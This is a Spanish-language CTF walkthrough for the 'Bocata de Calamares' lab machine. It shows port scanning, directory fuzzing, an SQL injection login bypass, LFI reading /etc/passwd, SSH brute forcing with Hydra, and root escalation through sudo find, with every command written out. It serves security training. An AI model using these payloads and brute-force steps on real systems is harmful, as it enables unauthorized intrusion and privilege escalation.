# 🥪 Resolución del CTF "Bocata de Calamares" | The HackersLabs

**Plataforma:** TheHackersLabs  
**Nombre de la máquina:** Bocata de Calamares  
**Dificultad:** Media  
**Enfoque:** SQL Injection, fuerza bruta SSH, escalada con GTFOBins

---

## 🔍 1. Escaneo de puertos con Nmap

```bash
nmap -p- -sS -sC -sV --min-rate 2000 -n -vvv -Pn 192.168.1.127 -oN escaneo.txt
```

<img width="827" height="520" alt="nmap" src="https://github.com/user-attachments/assets/6f1b89a0-b103-4930-b72c-3fd92532fc7a" />

**Puertos abiertos:**

- 22/tcp → OpenSSH 9.6p1 (Ubuntu)
- 80/tcp → Apache httpd 2.4.9 (Ubuntu)

---

## 🌐 2. Enumeración web

La web principal `http://192.168.1.127/` muestra una página de noticias falsas llamada **ALL FAKE NEWS**.  
Uno de los artículos menciona explícitamente SQLi como posible vulnerabilidad.

<img width="1127" height="315" alt="puerto80" src="https://github.com/user-attachments/assets/5e867b72-e09d-476a-a6ad-35ede2b9b4b5" />

---

## 🔎 3. Fuzzing con Feroxbuster

```bash
feroxbuster -u http://192.168.1.127 -x php,html,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="691" height="353" alt="fuzz" src="https://github.com/user-attachments/assets/02adc738-0d98-45b9-b4cf-c1ff9bf86908" />

Se identifican:

- `/login.php`
- `/admin.php`
- `/todo-list.php`
- `/sqli.php` (explica la vulnerabilidad con ejemplo)

---

## 💥 4. Inyección SQL

Desde `sqli.php` obtenemos un payload útil:

```
Usuario: admin
Contraseña: ' OR '1'='1
```

<img width="1124" height="552" alt="sqli php" src="https://github.com/user-attachments/assets/36bafbeb-d9ac-4de1-bb0c-47b8de6e82a2" /><br>

Lo usamos en `login.php`, accediendo así al panel de administración `admin.php`.

<img width="1127" height="484" alt="login php" src="https://github.com/user-attachments/assets/38db0892-2fa9-48bf-9c7b-35990bc1f111" /><br>

<img width="1127" height="182" alt="admin php" src="https://github.com/user-attachments/assets/3e72c06c-e0f8-42b0-9864-c4a372b7959a" />

---

## 📋 5. Enumeración desde admin.php

`admin.php` da acceso a `/todo-list.php`. Allí encontramos una pista:

<img width="1125" height="125" alt="todo-list php" src="https://github.com/user-attachments/assets/5f428bc8-5870-47b0-8b90-6ef916f4832e" /><br>

> “He creado una página para leer archivos, codificada en base64 (lee_archivos)”

---

## 🧠 6. Decodificación de ruta y explotación de LFI

```bash
echo "lee_archivos" | base64
# bGVlX2FyY2hpdm9zCg==
```

<img width="168" height="36" alt="lee_archivo_base64" src="https://github.com/user-attachments/assets/aa75c325-93c5-4060-8372-10fdee3bc7d3" /><br>

Al visitar:

```
http://192.168.1.127/bGVlX2FyY2hpdm9zCg==.php
```

<img width="328" height="68" alt="lee_archivo php" src="https://github.com/user-attachments/assets/9f45e115-5ceb-471c-9cc5-d3a8e7ff0a56" /><br>

Se muestra un formulario vulnerable a LFI. Probamos con `/etc/passwd` y listamos usuarios.<br>
Detectamos: `superadministrator`

<img width="312" height="329" alt="etc-passwd" src="https://github.com/user-attachments/assets/9f1a289f-5742-47fb-8746-8fd43ef5d3ae" />

---

## 🔓 7. Ataque de fuerza bruta SSH con Hydra

```bash
hydra -l superadministrator -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.127 -t 64
```

<img width="1038" height="89" alt="hydra" src="https://github.com/user-attachments/assets/f112f03e-bc15-45f1-9f9d-92a61dde7879" /><br>

✅ Credenciales válidas:

- Usuario: `superadministrator`
- Contraseña: `princesa`

---

## 💻 8. Acceso SSH y flag de usuario

```bash
ssh superadministrator@192.168.1.127
```

<img width="413" height="397" alt="ssh-login" src="https://github.com/user-attachments/assets/010c1a02-33f3-49fd-b795-57d0157f8987" /><br>

Revisamos el home y encontramos:

<img width="484" height="137" alt="user-flag" src="https://github.com/user-attachments/assets/038517cc-29d6-4adc-a247-21c9c5ac2ed9" /><br>

```bash
cat flag.txt
```

---

## 📝 9. Recordatorio interesante

El archivo `recordatorio.txt` contiene esta nota:

> “Existe una página llamada GTFOBins muy útil para CTFs…”

<img width="620" height="31" alt="recordatorio txt" src="https://github.com/user-attachments/assets/e99821be-ee5f-403d-ad52-f6eed1452aab" />

---

## ⚙️ 10. Escalada de privilegios con find

```bash
sudo -l
```

<img width="640" height="73" alt="sudo -l" src="https://github.com/user-attachments/assets/739005fc-a45d-4c9c-ade5-e1d809148b2a" /><br>

Permisos detectados:

```bash
(ALL) NOPASSWD: /usr/bin/find
```

Con ayuda de GTFOBins:

<img width="425" height="104" alt="gtfobins" src="https://github.com/user-attachments/assets/107c5346-2c0e-4dde-96fa-e92d7b99a54f" /><br>

```bash
sudo find . -exec /bin/sh \; -quit
whoami
# root
```

<img width="451" height="47" alt="escalada-root" src="https://github.com/user-attachments/assets/ce77b57d-2ecc-4c87-a16d-1943af28fc27" />

---

## 🏁 11. Flag final (root)

```bash
cat /root/root.txt
# FLAG_ROOT_AQUI
```

<img width="119" height="37" alt="root-flag" src="https://github.com/user-attachments/assets/e6ef1c66-48e5-41da-959d-b4e39ab4ae75" />

---

## ✅ Conclusión

1. Escaneo y enumeración web.
2. SQLi para entrar como admin.
3. Pista sobre página oculta con LFI.
4. Decodificación base64 y lectura de `/etc/passwd`.
5. Fuerza bruta por SSH → acceso como superadministrator.
6. Flag de usuario + escalada con `find` vía GTFOBins.
7. Flag final obtenida como root.

¡Un CTF con narrativa divertida y técnicas variadas de pentesting!

